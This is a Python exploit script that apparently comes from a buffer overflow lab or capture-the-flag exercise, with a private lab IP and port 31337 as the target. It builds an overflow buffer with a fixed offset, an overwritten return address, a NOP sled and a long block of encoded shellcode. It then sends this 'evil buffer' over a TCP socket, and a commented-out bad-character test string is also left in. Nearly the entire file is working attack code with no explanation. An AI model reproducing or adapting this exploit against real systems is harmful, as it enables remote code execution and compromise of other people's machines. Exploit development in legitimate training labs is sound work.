import socket

ip = "10.10.8.63"
port = 31337

offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
# padding = ""
padding = "\x90" * 16

payload = ""

# payload = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
postfix = ""
shellcode =  ""
shellcode += "\xdb\xd9\xba\xfb\xfe\x4c\xdd\xd9\x74\x24\xf4"
shellcode += "\x58\x29\xc9\xb1\x5e\x31\x50\x1a\x03\x50\x1a"
shellcode += "\x83\xe8\xfc\xe2\x0e\x02\xa4\x52\xf0\xfb\x35"
shellcode += "\x0d\xc1\x29\xbc\x28\x45\x45\xed\x82\x0e\x0b"
shellcode += "\x1e\x68\x42\xb8\x95\x1c\x4a\xf1\x56\xef\x3d"
shellcode += "\xbb\x8e\xc1\x81\x90\xf3\x40\x7d\xeb\x27\xa3"
shellcode += "\xbc\x24\x3a\xa2\xf9\xf2\x30\x4b\x57\x8e\xe9"
shellcode += "\x83\xdc\xd2\x31\xa5\x32\x85\xc2\xe5\xca\xaf"
shellcode += "\x15\x91\x66\xb1\x45\xd1\x3e\xa9\xee\xbe\x9e"
shellcode += "\xc8\x23\x6e\x5b\x03\xb7\xb3\x52\x6b\x71\x47"
shellcode += "\xa0\x18\x83\x81\xf9\xde\x45\xe2\xf4\x72\x44"
shellcode += "\x3a\x3e\x6b\x32\x30\x3d\x16\x45\x83\x3c\xcc"
shellcode += "\xc0\x14\xe6\x87\x73\xf1\x17\x4b\xe5\x72\x1b"
shellcode += "\x20\x61\xdc\x3f\xb7\xa6\x56\x3b\x3c\x49\xb9"
shellcode += "\xca\x06\x6e\x1d\x97\xdd\x0f\x04\x7d\xb3\x30"
shellcode += "\x56\xd9\x6c\x95\x1c\xcb\x7b\xa9\xdc\x14\x84"
shellcode += "\xf7\x4a\xd9\x49\x08\x8b\x75\xd9\x7b\xb9\xda"
shellcode += "\x71\x14\xf1\x93\x5f\xe3\x80\xb3\x5f\x3b\x2a"
shellcode += "\xd3\xa1\xbc\x4b\xfa\x65\xe8\x1b\x94\x4c\x91"
shellcode += "\xf7\x64\x70\x44\x6d\x6e\xe6\x6d\x7a\x52\x7b"
shellcode += "\x19\x78\xaa\x92\x86\xf5\x4c\xc4\x66\x56\xc0"
shellcode += "\xa5\xd6\x16\xb0\x4d\x3d\x99\xef\x6e\x3e\x73"
shellcode += "\x98\x05\xd1\x2a\xf1\xb1\x48\x77\x89\x20\x94"
shellcode += "\xad\xf4\x63\x1e\x44\x09\x2d\xd7\x2d\x19\x5a"
shellcode += "\x80\xcd\xe1\x9b\x25\xce\x8b\x9f\xef\x99\x23"
shellcode += "\xa2\xd6\xee\xec\x5d\x3d\x6d\xea\xa2\xc0\x44"
shellcode += "\x81\x95\x56\xe9\xfd\xd9\xb6\xe9\xfd\x8f\xdc"
shellcode += "\xe9\x95\x77\x85\xb9\x80\x77\x10\xae\x19\xe2"
shellcode += "\x9b\x87\xce\xa5\xf3\x25\x29\x81\x5b\xd5\x1c"
shellcode += "\x91\x9c\x29\xe3\xbe\x04\x42\x1b\xff\xb4\x92"
shellcode += "\x71\xff\xe4\xfa\x8e\xd0\x0b\xcb\x6f\xfb\x43"
shellcode += "\x43\xfa\x6a\x21\xf2\xfb\xa6\xe7\xaa\xfc\x45"
shellcode += "\x3c\x5c\x87\x26\xc3\x9d\x78\x2f\xa0\x9d\x79"
shellcode += "\x4f\xd6\xa2\xac\x76\xac\xe5\x6d\xcd\xaf\xfb"
shellcode += "\x5b\x38\x58\xa2\x0e\x81\x05\x55\xe5\xc6\x33"
shellcode += "\xd6\x0f\xb7\xc7\xc6\x7a\xb2\x8c\x40\x97\xce"
shellcode += "\x9d\x24\x97\x7d\x9d\x6c"

payload = shellcode

buffer = overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
